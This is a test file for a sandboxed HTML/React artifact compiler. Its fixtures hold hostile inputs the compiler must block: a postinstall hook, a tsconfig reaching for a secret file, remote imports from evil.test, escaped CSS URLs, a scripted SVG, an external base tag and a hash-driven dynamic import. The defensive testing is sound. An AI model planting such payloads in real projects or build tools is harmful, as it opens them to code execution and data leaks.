import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { createHash } from 'node:crypto';
import { parse } from 'parse5';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { compileArtifact } from '../compiler.js';
import { readSnapshot } from '../snapshot.js';
let root: string;
const sdk = 'window.synax={standalone:true};';
function write(name: string, text: string) { fs.mkdirSync(path.dirname(path.join(root, name)), { recursive: true }); fs.writeFileSync(path.join(root, name), text); }
beforeEach(() => { root = fs.mkdtempSync(path.join(os.tmpdir(), 'artifact-compiler-')); });
afterEach(() => fs.rmSync(root, { force: true, recursive: true }));
const build = (name = 'index.html', kind: 'html' | 'react' = 'html') => compileArtifact(readSnapshot(root, name), kind, { sdkSource: sdk });
describe('fixed-policy isolated compiler', () => {
  it('bundles local CSS imports, JS and images without copying unrelated files', async () => {
    write('index.html', '<link rel="stylesheet" href="styles.css"><img src="icon.svg"><h1 class="test">Hi</h1><script src="main.js"></script>');
    write('styles.css', '@import "./colors.css"; .test {background-image:url(./icon.svg)}');
    write('colors.css', '.test {color:red}'); write('main.js', 'document.querySelector("h1").dataset.ready="yes"');
    write('icon.svg', '<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0L5 5"/></svg>'); write('unrelated.ts', 'THIS MUST NOT BE COPIED');
    const result = await build();
    expect(result.source.map(f => f.path)).toEqual(['colors.css', 'icon.svg', 'index.html', 'main.js', 'styles.css']);
    expect(result.html).toContain('data:image/svg+xml'); expect(result.html).not.toContain('src="main.js"');
    expect(result.html.indexOf(sdk)).toBeLessThan(result.html.indexOf('dataset.ready'));
    const document = parse(result.html);
    const hashes: string[] = [];
    const walk = (n: any) => { if (['style','script'].includes(n.tagName)) hashes.push(createHash('sha256').update(n.childNodes.map((x: any) => x.value ?? '').join('')).digest('base64')); n.childNodes?.forEach(walk); }; walk(document);
    for (const digest of hashes) expect(result.html).toContain(`'sha256-${digest}'`);
  });
  it('compiles TSX default export, relative modules, CSS and fixed React dependencies', async () => {
    write('app.tsx', 'import React from "react"; import {label} from "./label"; import "./style.css"; export default function App(){return <button>{label}</button>}');
    write('label.ts', 'export const label: string = "Works offline"'); write('style.css', 'button {color: purple}');
    write('tsconfig.json', '{"extends":"../../secret.json","compilerOptions":{"jsxFactory":"evil"}}');
    write('package.json', '{"scripts":{"postinstall":"touch PWNED"}}');
    const result = await build('app.tsx', 'react');
    expect(result.html).toContain('Works offline'); expect(result.html).toContain('createRoot');
    expect(result.source.map(f => f.path)).toEqual(['app.tsx', 'label.ts', 'style.css']);
    expect(result.dependencies.find(d => d.name === 'react')?.version).toBeTruthy(); expect(fs.existsSync(path.join(root, 'PWNED'))).toBe(false);
  });
  it.each(['node:fs','https://evil.test/code.js','unapproved-package'])('rejects forbidden imports %s', async specifier => {
    write('app.tsx', `import x from ${JSON.stringify(specifier)}; export default function App(){return x}`);
    await expect(build('app.tsx', 'react')).rejects.toMatchObject({code:'UNSUPPORTED_IMPORT'});
  });
  it.each(['@import "https://evil.test/a.css";', 'div{background:u\\72l(https://evil.test/x)}'])('rejects remote CSS including escaped URLs %s', async css => {
    write('index.html', `<style>${css}</style>`);
    await expect(build()).rejects.toMatchObject({code:'POLICY_BLOCKED'});
  });
  it('rejects active SVG, mislabeled binary, and external base', async () => {
    write('index.html','<img src="evil.svg">'); write('evil.svg','<svg><script>alert(1)</script></svg>');
    await expect(build()).rejects.toMatchObject({code:'POLICY_BLOCKED'});
    write('index.html','<img src="evil.png">'); write('evil.png','<html>not a PNG</html>');
    await expect(build()).rejects.toMatchObject({code:'POLICY_BLOCKED'});
    write('index.html','<base href="https://evil.test/"><p>Hi</p>');
    await expect(build()).rejects.toMatchObject({code:'POLICY_BLOCKED'});
  });
  it('terminates builds on deadline and abort, never evaluates generated code', async () => {
    write('index.html','<script>while(true){}</script>');
    await expect(compileArtifact(readSnapshot(root,'index.html'),'html',{sdkSource:sdk,timeoutMs:1})).rejects.toMatchObject({code:'BUILD_TIMEOUT'});
    const abort = new AbortController(); abort.abort();
    await expect(compileArtifact(readSnapshot(root,'index.html'),'html',{sdkSource:sdk,signal:abort.signal})).rejects.toMatchObject({code:'BUILD_CANCELLED'});
    expect((await build()).html).toContain('while (true)');
  });
});
it('rewrites inline CSS into hash-authorized styles and blocks dynamic remote imports', async () => {
  write('index.html','<p style="color: red">Styled</p>');
  const result = await build(); expect(result.html).not.toContain('style="'); expect(result.html).toContain("style-src-attr 'none'"); expect(result.html).not.toContain("'unsafe-inline'");
  write('index.html','<script>const url=location.hash.slice(1); import(url)</script>');
  await expect(build()).rejects.toMatchObject({code:'INVALID_SOURCE'});
});
it('bounds pathological HTML nesting and oversized DOM structure', async () => {
  write('index.html','<div>'.repeat(150)+'nested'+'</div>'.repeat(150));
  await expect(build()).rejects.toMatchObject({code:'RESOURCE_LIMIT'});
  write('index.html','<br>'.repeat(11000));
  await expect(build()).rejects.toMatchObject({code:'RESOURCE_LIMIT'});
});
it('bundles fixed d3@7.9.0 and reports actual transitive dependency licenses', async () => {
  write('app.tsx','import {scaleLinear} from "d3"; export default function App(){return <output>{scaleLinear().domain([0,10]).range([0,200])(5)}</output>}');
  const result=await build('app.tsx','react');
  expect(result.html).toContain('linear');
  expect(result.dependencies.find(d=>d.name==='d3')).toMatchObject({version:'7.9.0',license:'ISC'});
  expect(result.dependencies.find(d=>d.name==='d3-scale')?.licenseText).toBeTruthy();
  expect(result.dependencies.find(d=>d.name==='internmap')?.licenseText).toBeTruthy();
});
it('never embeds host dependency paths in generated comments or CommonJS module identities', async () => {
  const { createRequire }=await import('node:module');
  const modulesRoot=fs.realpathSync(path.dirname(path.dirname(createRequire(import.meta.url).resolve('react'))));
  write('private-check.tsx','import React from "react";import {scaleLinear} from "d3";export default function App(){return <p>{scaleLinear()(0.5)}</p>}');
  const result=await build('private-check.tsx','react');
  for(const location of [os.homedir(),modulesRoot,root]) {
    expect(result.html).not.toContain(location);
    expect(result.html).not.toContain(location.replace(/\\/g,'/'));
    expect(result.html).not.toContain(location.replace(/[^\w$]/g,'_'));
  }
  expect(result.html).not.toMatch(/(?:\.\.\/)+.*node_modules/);
});
it.each(['d3-scale','d3/src/index.js','__proto__','constructor'])('does not expose transitive or inherited allowlist entries: %s',async specifier=>{
  write('app.tsx',`import x from ${JSON.stringify(specifier)};export default function App(){return x}`);
  await expect(build('app.tsx','react')).rejects.toMatchObject({code:'UNSUPPORTED_IMPORT'});
});
